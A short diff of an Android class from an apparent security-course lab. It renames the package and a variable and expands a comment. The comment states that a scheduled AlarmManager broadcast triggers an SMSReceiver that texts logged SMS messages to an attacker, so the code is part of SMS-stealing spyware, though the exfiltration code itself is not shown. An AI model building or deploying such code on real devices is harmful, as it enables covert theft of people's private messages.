@@ -1,4 +1,4 @@
-package cps633.lab4;
+package cps633.lab4_ps2_06;
 
 import android.app.Activity;
 import android.app.AlarmManager;
@@ -40,13 +40,13 @@ public class Lab4 extends Activity {
         myAlarmDate.set(Calendar.MINUTE, 59);
         myAlarmDate.set(Calendar.SECOND, 59);
 
-        //AlarmManager
+        //AlarmManager that sends the intent to SMSReceiver which then texts the attacker with the logged SMS messages
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
 
         Intent myIntent = new Intent(this, SMSReceiver.class);
         myIntent.setAction("AlarmStuff");
-        PendingIntent _myPendingIntent = PendingIntent.getBroadcast(this, 0, myIntent, PendingIntent.FLAG_UPDATE_CURRENT);
-        alarmManager.set(AlarmManager.RTC_WAKEUP, myAlarmDate.getTimeInMillis(),_myPendingIntent);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, myIntent, PendingIntent.FLAG_UPDATE_CURRENT);
+        alarmManager.set(AlarmManager.RTC_WAKEUP, myAlarmDate.getTimeInMillis(),pendingIntent);
     }
 
     public void button(View view) {
